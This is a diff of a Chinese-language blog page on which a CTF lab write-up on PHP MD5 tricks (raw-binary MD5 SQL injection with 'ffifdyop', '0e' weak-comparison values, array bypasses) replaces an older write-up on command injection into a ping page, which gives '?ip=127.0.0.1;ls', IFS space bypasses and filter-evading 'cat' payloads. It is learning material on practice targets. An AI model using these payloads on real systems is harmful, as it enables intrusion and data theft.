@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>Ping ping ping | 66+144</title>
+    <title>BJDCTF_Easy-MD5 | 66+144</title>
     <meta name="author" content="LUEFLAM" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -150,14 +150,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>Ping ping ping</h1>
+        <h1>BJDCTF_Easy-MD5</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2023/10/17
+            2023/10/27
         </span>
         
         <span class="category">
@@ -178,7 +178,12 @@
             
             <span class="tag">
                 
-                <a href="/MIA/tags/CTF/" style="color: #03a9f4">CTF</a>
+                <a href="/MIA/tags/CTF/" style="color: #00a596">CTF</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/MIA/tags/TOOLs/" style="color: #00bcd4">TOOLs</a>
             </span>
             
         </span>
@@ -186,82 +191,119 @@
     </div>
     
     <div class="content" v-pre>
-        <p>依旧是随便点开的一个题目，但很有趣。<br>主要是想用用firefox渗透版，不太想每次打开burp suite。</p>
-<span id="more"></span>
+        <p><font size=1>只是隐隐约约记得MD5是一种加密算法</font></p>
+<h1 id="SQL-Injection？"><a href="#SQL-Injection？" class="headerlink" title="SQL Injection？"></a>SQL Injection？</h1><p>输入：</p>
+<ul>
+<li>数字</li>
+<li>字母</li>
+<li>数字+符号</li>
+<li>简单SQL语句</li>
+<li>简单XSS语句</li>
+</ul>
+<p>都没什么效果，所以抓包。</p>
+<pre><code class="http">GET /leveldo4.php?password=1 HTTP/1.1
+Host: f4a0e561-18e7-44bb-97d3-df00b826a81a.node4.buuoj.cn:81
+Upgrade-Insecure-Requests: 1
+...
+Referer: http://f4a0e561-18e7-44bb-97d3-df00b826a81a.node4.buuoj.cn:81/leveldo4.php?password=9
+Accept-Encoding: gzip, deflate
+...
+</code></pre>
+<p>查看Response</p>
+<pre><code class="htttp">HTTP/1.1 200 OK
+Server: openresty
+Date: Fri, 27 Oct 2023 04:28:47 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Hint: select * from &#39;admin&#39; where password=md5($pass,true)
+X-Powered-By: PHP/7.3.13
+Content-Length: 3107
+</code></pre>
+<p>那个<code>Hint</code>(从 admin 表中选择密码字段等于 $pass 变量的 MD5 值的记录),比较显眼。所以启用<code>sqlmap</code>。<br>同时也启用<code>dirsearch</code>和<code>dirmap</code>（结果是什么也没得到）。<br><strong>结果</strong>:</p>
+<ul>
+<li><code>sqlmap</code>——<code>GET parameter &#39;password&#39; does not seem to be injectable</code></li>
+<li><code>dirmap</code>——没有可用信息</li>
+<li><code>dirsearch</code>——几个200 URL都是跳转<code>leveldo4.php</code></li>
+</ul>
+<h1 id="MD5？"><a href="#MD5？" class="headerlink" title="MD5？"></a>MD5？</h1><p>再回看<code>Hint</code>：</p>
+<blockquote>
+<p>PHP中md5函数如果第二个参数设为true，返回的是二进制内容，如果能恰好凑出类似’or的字符串，就可以构成SQL注入</p>
+</blockquote>
+<p>所以就是要构造一个经过<code>MD5</code>再经过<code>二进制</code>后得到的值有<code>‘or</code>的payload。<br>上网找了找，说是有</p>
+<ul>
+<li><code>ffifdyop</code></li>
+</ul>
+<p>将password的值修改为<code>ffidyop</code>就会跳转界面<code>levels91.php</code>。<br>好大一个Do You Like MD5?</p>
+<p>查看页面代码：</p>
+<pre><code class="html">&lt;!--
+    $a = $GET[&#39;a&#39;];
+    $b = $_GET[&#39;b&#39;];
 
-<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><h3 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h3><p>打开靶场，扑面而来一个<br><code>/?ip=</code><br>（如果有点觉悟就会想起来之前做的文件上传从而意识到这是个URL地址符提示。不过当时没有，甚至在想这是什么代码……php？html？）<br>于是熟练的打开edge查询wp。<br>于是</p>
-<pre><code class="URL">http://2993ad62-21c8-4f1d-b4d6-05bdd7130b70.node4.buuoj.cn:81/?ip=127.0.0.1;ls
+    if($a != $b &amp;&amp; md5($a) == md5($b))&#123;
+        //...
+    &#125;
+--&gt;
 </code></pre>
-<p>喜提<br>(补充：尝试了一下<code>&amp;&amp; ls</code>，什么有用的也没有得到)</p>
-<pre><code class="txt">PING 127.0.0.1 (127.0.0.1): 56 data bytes
-flag.php
-index.php
-</code></pre>
-<p>这告诉我们有两个php文件，名字如上。</p>
-<h3 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h3><p>再用<code>cat</code>命令</p>
-<pre><code class="url">/?ip=xxx;cat flag.php
-</code></pre>
-<p>喜提<code>fuck your space</code>。<br>好嘛，用能想到的space替换符，%20之类的，毫不意外不行。<br>wp提供了更多的绕过space：</p>
-<pre><code class="txt">$&#123;IFS&#125;
-$IFS$1
-$&#123;IFS
-&lt;&gt; or &lt; 重定向符替换
-%09
-</code></pre>
-<p>原博一个个试后告诉大家，<code>$IFS$1</code>行得通。</p>
-<pre><code class="URL">https://xxx/?ip=127.0.0.1;cat$IFS$1flag.php
-</code></pre>
-<p>又告诉你不行——因为flag被过滤了。</p>
-<h3 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h3><p>试一下index.php，</p>
-<pre><code class="php">PING 127.0.0.1 (127.0.0.1): 56 data bytes
-/?ip=
-|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
-    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
-    die(&quot;fxck your symbol!&quot;);
-  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;
-    die(&quot;fxck your space!&quot;);
-  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
-    die(&quot;fxck your bash!&quot;);
-  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
-    die(&quot;fxck your flag!&quot;);
-  &#125;
-  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
-  echo &quot;
-&quot;;
-  print_r($a);
-&#125;
-?&gt;
-</code></pre>
-<p>解释一下就是：</p>
 <ul>
 <li><ol>
-<li><code>PING 127.0.0.1 (127.0.0.1): 56 data bytes</code>：这是一个命令行输出，表示将对IP地址 127.0.0.1 进行Ping测试。<code>/?ip=</code>：这是一个URL参数，用于接收要测试的目标IP地址。</li>
+<li>从 GET 请求参数中获取 <code>a</code> 和 <code>b</code> 的值，并将它们分别赋给变量 <code>$a</code> 和 <code>$b</code>。</li>
 </ol>
 </li>
 <li><ol start="2">
-<li><code>|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))</code>：这是一个正则表达式，用于检查输入的IP地址是否包含特定的符号（ <code>&#39;</code>, <code>&quot;</code>, <code>\</code>, <code>(</code>, <code>)</code>, <code>[</code>, <code>]</code>, <code>&#123;</code>, <code>&#125;</code>）。然后 <code>echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</code>：这一行判断输入的IP地址是否包含特殊字符，并输出匹配结果。最后<code>die(&quot;fxck your symbol!&quot;);</code>：如果前面的正则表达式匹配到特殊字符，将输出错误信息并终止程序运行。</li>
+<li>接下来，使用条件判断语句进行逻辑判断。如果 <code>$a</code> 不等于 <code>$b</code> 并且 <code>$a</code> 的 MD5 值等于 <code>$b</code> 的 MD5 值，即 <code>md5($a) == md5($b)</code>，则进入条件判断的代码块内部。</li>
 </ol>
-</li>
-<li><ol start="3">
-<li><code>preg_match(&quot;/ /&quot;, $ip)</code>：这是一个正则表达式，用于检查输入的IP地址是否包含空格。然后<code>die(&quot;fxck your space!&quot;);</code>：如果输入的IP地址包含空格，将输出错误信息并终止程序运行。后面都一样就不重复了。</li>
-</ol>
-</li>
-<li><ol start="4">
-<li><code>$a = shell_exec(&quot;ping -c 4 &quot;.$ip);</code>：执行Ping命令，通过shell_exec函数在操作系统中运行命令，并将结果存储在变量$a中。</li>
-</ol>
-</li>
-<li><p>5.<code>print_r($a);</code>：打印Ping命令的结果，显示Ping测试的输出信息。</p>
 </li>
 </ul>
-<h3 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h3><p>看完这么多过滤，基本可以确定没什么常规的可以写了。<br>于是一个有趣的就来了：<br><strong>改变变量值</strong></p>
-<p>有一个变量<code>$a</code>，原本的值是第4条说的，我们进行人为修改（它也没禁止）：</p>
-<pre><code class="url">https://xxx/?ip=xxxx;a=g;cat$IFS$1fla$a.php
+<p>所以接下来又是寻找符合条件的a与b。<br>有两种解决方式：</p>
+<blockquote>
+<p>1.PHP弱类型比较绕过</p>
+</blockquote>
+<p>参考<a href=https://blog.csdn.net/u014549283/article/details/81288443>PHP hash漏洞之MD5</a>可以得到：</p>
+<ul>
+<li>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0<br>（为什么说是hash值？）<br>另一个简洁版本：<a href=https://www.cnblogs.com/ainsliaea/p/15126218.html>PHP MD5相等绕过</a></li>
+</ul>
+<p>构造payload：</p>
+<pre><code class="http">?a=s878926199a&amp;b=s155964671a
 </code></pre>
-<p>解释一下就是：</p>
-<pre><code class="python">a=g
-flag=fla$a
+<blockquote>
+<p>2.数组绕过</p>
+</blockquote>
+<p>在上面那个简洁版本里也提到了这个数组绕过，不过说PHP8就行不通了。不过靶场的PHP依旧适用。</p>
+<p>参考<a href=https://mrl64.github.io/2021/12/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/>PHP弱类型绕过</a>:</p>
+<ul>
+<li><code>md5()/sha()</code>这类函数无法处理数组，如果传入的是数组,<code>md5()</code>返回<code>NULL</code>，加密后得到的也是<code>NULL</code>，满足两个md5值相等</li>
+</ul>
+<p>构造payloa：</p>
+<pre><code class="http">?a[]=1&amp;b[]=2
 </code></pre>
-<p>不懂的永别了.jpg<br>然后就变成了初始界面。很懵逼是吧。<br>查看页面源代码获得惊喜。至于为什么会这样待我研究一下再来写。</p>
+<p> <code>a[]=1&amp;b[]=2</code>，其中 <code>a[]</code> 和 <code>b[]</code> 是数组参数。当 PHP 解析这个查询字符串时，它会将这些参数解析为数组。</p>
+<pre><code class="php">$_GET[&#39;a&#39;] = array(&#39;1&#39;);
+$_GET[&#39;b&#39;] = array(&#39;2&#39;);
+</code></pre>
+<ul>
+<li>由于md5()函数存在缺陷,加密数组的时候返回值是NULL，即在MD5加密之后，<code>a[]=NULL、b[]=NULL</code>，符合要求。</li>
+</ul>
+<p>然后我们又跳转页面…</p>
+<hr>
+<h1 id="param？"><a href="#param？" class="headerlink" title="param？"></a>param？</h1><pre><code class="php">&lt;?php
+error_reporting(0);
+include &quot;flag.php&quot;;
+
+highlight_file(__FILE__);
+
+if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))&#123;
+    echo $flag;
+&#125;
+</code></pre>
+<p>其实可以看出就是call back，只不过要以<code>POST</code>方式传参，所以打开我的firefox渗透版:</p>
+<pre><code class="http">http://fdcf43aa-9abd-4770-8798-7d1efbb1ffb0.node4.buuoj.cn:81/levell14.php
+//post data
+param1[]=1&amp;param2[]=2
+</code></pre>
+<p>最后得到flag。</p>
+<hr>
+<h1 id="ファンワイ"><a href="#ファンワイ" class="headerlink" title="ファンワイ"></a>ファンワイ</h1><p>比较详细的解释了PHP比较和绕过的原理：<a href=https://xz.aliyun.com/t/5426>PHP 黑魔法</a><br></p>
+<p><a href=https://www.cnblogs.com/linfangnan/p/13411103.html>CTF WEB PHP弱类型绕过</a></p>
 
     </div>
     
